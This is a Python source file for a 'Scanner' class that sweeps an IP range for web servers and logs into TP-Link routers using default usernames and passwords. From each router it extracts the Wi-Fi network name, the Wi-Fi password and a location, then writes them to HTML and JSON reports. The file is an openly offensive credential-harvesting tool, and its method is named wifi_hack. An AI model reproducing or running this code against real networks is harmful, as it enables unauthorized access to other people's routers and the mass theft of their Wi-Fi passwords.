import json
import os
import socket
import webbrowser

import requests
from bs4 import BeautifulSoup

from . import TpLinkScreap, progressBar


class Scanner:
    def __init__(self, username=None, password=None, urls=None, range=None):
        # Default username | You can give 2 default username | You have ti give username as a list ["admin",'name']
        self.username = username
        # Default passwords | You can give 2 default password | You have ti give password as a list ["admin",'passoword']
        self.password = password
        # Urls will be a list 
        self.urls = urls
        # Range will be a ip rang like ---> "10.0.0.1-10.0.0.10"
        self.range = range

    @staticmethod 
    def get_router_name(url):
        url = 'http://'+url+'/'
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        title = soup.find('title')
        try:
            return title.text
        except:
            return None

    def wifi_hack(self):
        for i,url in enumerate(self.urls):
            progressBar.printProgressBar(i + 1, len(self.urls), prefix = 'Progress:', suffix = 'Complete', length = 50)
            if len(self.username) == 1:
                try:         
                    router = TpLinkScreap.TPLinkClient(username=self.username[0],password=self.password[0], router_url=url)
                    usrName = router.get_wan_connection_status()['username']
                    if "_" in usrName:
                        Location = usrName.split("_")[1]
                    else:
                        Location = None
                    wifiName = router.get_wifi_connection_details()['SSID'] 
                    Password = router.get_wifi_connection_details()['X_TP_PreSharedKey']
                    yield {"WifiName": wifiName, "Password": Password, "Location": Location, "URL": url}
                except KeyboardInterrupt:
                    exit()
                except:
                    continue
            else:
                try:         
                    router = TpLinkScreap.TPLinkClient(username=self.username[0],password=self.password[0], router_url=url)
                    usrName = router.get_wan_connection_status()['username']
                    if "_" in usrName:
                        Location = usrName.split("_")[1]
                    else:
                        Location = None
                    wifiName = router.get_wifi_connection_details()['SSID'] 
                    Password = router.get_wifi_connection_details()['X_TP_PreSharedKey']
                    yield {"WifiName": wifiName, "Password": Password, "Location": Location, "URL": url}
                except KeyboardInterrupt:
                    exit()
                except:
                    try:
                        router = TpLinkScreap.TPLinkClient(username=self.username[-1],password=self.password[-1], router_url=url)
                        usrName = router.get_wan_connection_status()['username']
                        if "_" in usrName:
                            Location = usrName.split("_")[1]
                        else:
                            Location = None
                        wifiName = router.get_wifi_connection_details()['SSID'] 
                        Password = router.get_wifi_connection_details()['X_TP_PreSharedKey']
                        yield {"WifiName": wifiName, "Password": Password, "Location": Location, "URL": url}
                    except KeyboardInterrupt:
                        exit()
                    except:
                        continue

    @staticmethod
    def is_http_running(host, port=80):
        captive_dns_addr = ""
        host_addr = ""
        try:
            captive_dns_addr = socket.gethostbyname("BlahThisDomaynDontExist22.com")
        except:
            pass
        try:
            host_addr = socket.gethostbyname(host)
            if (captive_dns_addr == host_addr):
                return False
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            s.close()
        except:
            return False
        return True

    def scan_ip(self):
        start, end = self.range.split('-')
        sfourth, sthird, ssecond, sfirst = start.split(".")
        sfirst, ssecond, sthird, sfourth = int(sfirst), int(ssecond), int(sthird), int(sfourth)
        efourth, ethird, esecond, efirst = end.split(".")
        efirst, esecond, ethird, efourth = int(efirst), int(esecond), int(ethird), int(efourth)
        while True:
            if sfirst == 255:
                ssecond += 1
                sfirst = 0
            if ssecond == 255:
                sthird += 1
                ssecond = 0
            if sthird == 255:
                sfourth += 1
                sthird = 0
            if sfourth == efourth:
                if sthird == ethird:
                    if ssecond == esecond:
                        if sfirst == efirst:
                            break
            ip = f"{sfourth}.{sthird}.{ssecond}.{sfirst}"
            if self.is_http_running(ip):
                print("                 ", end="\r", flush=True)
                print(ip, end="\r", flush=True)
                yield f"{sfourth}.{sthird}.{ssecond}.{sfirst}"
            sfirst += 1

    @staticmethod
    def save_as_html(data, dir=os.path.abspath("WifiScanner")+r"\src\cache", name="out.html"):
        html = []
        for i, datum in enumerate(data):
            if i%2 == 0:
                html.append("<tr class='r1'>"+
                f"<td class='head' width='11%'>{i+1}</td>"+
                f"<td class='head' width='11%'>{datum['WifiName']}</td>"+
                f"<td class='head' width='11%' id='ip'>{datum['URL']}</td>"+
                f"<td class='head' width='11%'>{datum['Password']}</td>"+
                f"<td class='head' width='11%'>{datum['Location']}</td>"+
                "</tr>")
            else:
                html.append("<tr class='r2'>"+
                f"<td class='head' width='11%'>{i+1}</td>"+
                f"<td class='head' width='11%'>{datum['WifiName']}</td>"+
                f"<td class='head' width='11%' id='ip'>{datum['URL']}</td>"+
                f"<td class='head' width='11%'>{datum['Password']}</td>"+
                f"<td class='head' width='11%'>{datum['Location']}</td>"+
                "</tr>")
        if len(html)>1:
            website = ','.join(html).replace(',', '')
        else:
            website = html[0]
        website = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>IP List</title><style type="text/css">@media screen{body {font-family:Verdana, Geneva, sans-serif; background:#fff; color:#10494E;}table {border:1px solid #b3cddc; border-collapse:collapse; border-spacing:0px;}th {background-color:#c8dfec; text-align:AIPS Results; padding:5px 10px;}td {padding-left:10px; padding-right:10px; text-align: center;}.r1 {background-color:#e9f4fb;}.r2 {background-color:#f3f8fb;}.head {padding-top:3px; padding-bottom:3px; border-top:1px solid #fff;}.res, .rhead {font-size:0.8em; padding-top:1px; padding-bottom:2px;}.res {float:left; padding-left:15px;}.rhead {float:left; margin-left:30px;}.svc { color:#000000;}}</style></head><table cellpadding="0" width="100%" dir="ltr"><tr><th width="11%">#</th><th width="11%">Name</th><th width="11%">IP</th><th width="11%">Password</th><th width="11%">Location</th>'+f'</tr>{website}</table></html>'
        website = BeautifulSoup(website, 'html.parser').prettify()
        with open(dir+"\\"+name, 'w') as file:
            file.write(str(website))

    @staticmethod
    def open_htmlfile(dir=os.path.abspath("WifiScanner")+r"\src\cache", name="out.html"):
        url=("file:///"+dir+"\\"+name)
        if " " in url:
            url = url.replace(" ", "%20")
        if "\\" in url:
            url = url.replace("\\",'/')
        print(url)
        webbrowser.open_new_tab(url)

    @staticmethod
    def save_as_json(data, dir=os.path.abspath("WifiScanner")+r"\src\cache", name="data.json"):
        Data = json.dumps(data, indent=4)
        with open(dir+"\\"+name, 'w') as file:
            file.write(Data)
            file.close()
    
    @staticmethod
    def load_json(location):
        with open(location, 'r') as f:
            data = json.load(f)
            f.close()
            return data

